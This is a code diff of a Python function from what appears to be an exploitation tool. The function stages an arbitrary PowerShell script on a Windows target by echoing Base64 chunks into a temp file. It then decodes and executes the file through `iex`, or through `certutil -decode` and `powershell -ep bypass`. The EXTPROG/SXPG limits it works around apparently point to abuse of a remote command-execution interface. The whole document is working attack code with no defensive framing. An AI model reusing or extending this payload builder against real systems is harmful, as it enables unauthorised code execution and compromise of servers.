@@ -381,50 +381,47 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     a final "command"/"params" that is the execute step.
     """
     import base64
-    enc = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
     tmp = r"C:\Windows\Temp\s"
 
-    # Split Base64 into chunks that fit in EXTPROG (128 bytes).
-    # "cmd.exe /C echo CHUNK>>C:\Windows\Temp\s" = ~42 overhead
+    # GW path: UTF-16LE Base64 (for PowerShell Unicode.GetString decode)
+    enc_u16 = base64.b64encode(
+        ps_script.encode("utf-16-le")).decode("ascii")
     chunk_size = 80
-    chunks = [enc[i:i+chunk_size] for i in range(0, len(enc), chunk_size)]
-
+    gw_chunks = [enc_u16[i:i+chunk_size]
+                 for i in range(0, len(enc_u16), chunk_size)]
     steps = []
-    for idx, chunk in enumerate(chunks):
+    for idx, chunk in enumerate(gw_chunks):
         redir = ">" if idx == 0 else ">>"
         steps.append({
             "command": f"cmd.exe /C echo {chunk}{redir}{tmp}",
             "params": "",
         })
-
-    # Read Base64 file with gc (Get-Content), join lines, decode
-    # UTF-16LE and execute. No -Raw (PS v2 compat), no certutil.
-    # gc reads lines, -join'' concatenates, then decode+exec.
     run_cmd = (f"powershell -nop -c \"$b=(gc '{tmp}')-join'';"
                f"iex([Text.Encoding]::Unicode.GetString("
                f"[Convert]::FromBase64String($b)))\"")
     assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
 
-    # SXPG steps: same chunks but split into EXTPROG + PARAMS.
-    # SXPG needs binary in EXTPROG, args in PARAMS (no full cmd line).
+    # SXPG path: ASCII Base64 (certutil decodes to plain ASCII .ps1).
+    # No UTF-16LE — certutil output has no BOM, old PS reads as ANSI.
+    enc_ascii = base64.b64encode(
+        ps_script.encode("ascii")).decode("ascii")
+    sxpg_chunks = [enc_ascii[i:i+chunk_size]
+                   for i in range(0, len(enc_ascii), chunk_size)]
     sxpg_steps = []
-    for idx, chunk in enumerate(chunks):
+    for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
             "command": "cmd.exe",
             "params": f"/C echo {chunk}{redir}{tmp}",
         })
-    # Decode b64 → UTF-16LE .ps1 via certutil, then run with -f
     sxpg_steps.append({
         "command": "certutil.exe",
         "params": f"-decode {tmp} {tmp}.ps1",
     })
     return {
-        # GW path: full command line in EXTPROG
         "steps": steps,
         "command": run_cmd,
         "params": "",
-        # SXPG path: split EXTPROG + PARAMS per step
         "sxpg_steps": sxpg_steps,
         "sxpg_command": "powershell.exe",
         "sxpg_params": f"-nop -ep bypass -f {tmp}.ps1",
